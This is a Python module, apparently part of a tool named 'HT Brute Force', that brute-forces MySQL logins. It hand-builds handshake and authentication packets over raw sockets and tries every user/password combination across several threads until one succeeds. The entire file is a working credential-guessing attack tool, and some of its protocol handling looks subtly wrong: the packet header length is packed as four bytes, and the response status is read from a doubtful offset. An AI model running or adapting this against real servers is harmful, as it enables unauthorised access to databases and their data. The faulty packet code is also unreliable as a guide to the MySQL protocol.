"""HT Brute Force — MySQL brute force (via python mysql or fallback socket).
Uses pure socket handshake when PyMySQL unavailable.
"""
import socket, struct, time, threading, queue

class MySQLBruter:
    def __init__(self, timeout=10, max_threads=5, stop_event=None):
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event or threading.Event()
        self.results = []

    def _scramble(self, password, scramble):
        """MySQL scramble function (double SHA1)."""
        import hashlib
        if not password:
            return b''
        stage1 = hashlib.sha1(password.encode()).digest()
        stage2 = hashlib.sha1(stage1).digest()
        stage3 = hashlib.sha1(scramble + stage2).digest()
        result = bytes(a ^ b for a, b in zip(stage1, stage3))
        return result

    def _try_login(self, host, port, user, passwd):
        if self.stop_event.is_set():
            return None
        t0 = time.time()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, port))
            # Read greeting packet
            data = s.recv(1024)
            if len(data) < 70:
                return None
            scramble = data[37:53]
            # Auth packet
            cap = 0x3f7fff
            max_packet = 16777215
            charset = 33  # utf8mb4
            user_bytes = user.encode('utf-8')
            pass_bytes = self._scramble(passwd, scramble) if passwd else b''
            payload = struct.pack('<I', cap) + struct.pack('<I', max_packet) + bytes([charset]) + b'\x00' * 23 + user_bytes + b'\x00' + bytes([len(pass_bytes)]) + pass_bytes
            packet = struct.pack('<I', len(payload)) + bytes([1]) + payload
            s.send(packet)
            resp = s.recv(1024)
            elapsed = time.time() - t0
            s.close()
            if resp and resp[4] == 0x00:
                return {"user": user, "password": passwd, "time_s": round(elapsed, 2)}
            return None
        except (socket.timeout, ConnectionRefusedError, OSError):
            return {"error": "connect"}

    def run(self, host, port, users, passwords):
        q = queue.Queue()
        for u in users:
            for p in passwords:
                q.put((u, p))
        def worker():
            while not q.empty() and not self.stop_event.is_set():
                try:
                    u, p = q.get_nowait()
                except Exception:
                    break
                r = self._try_login(host, port, u, p)
                if r:
                    self.results.append(r)
                    if r.get("password"):
                        self.stop_event.set()
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(self.max_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 5)
        return self.results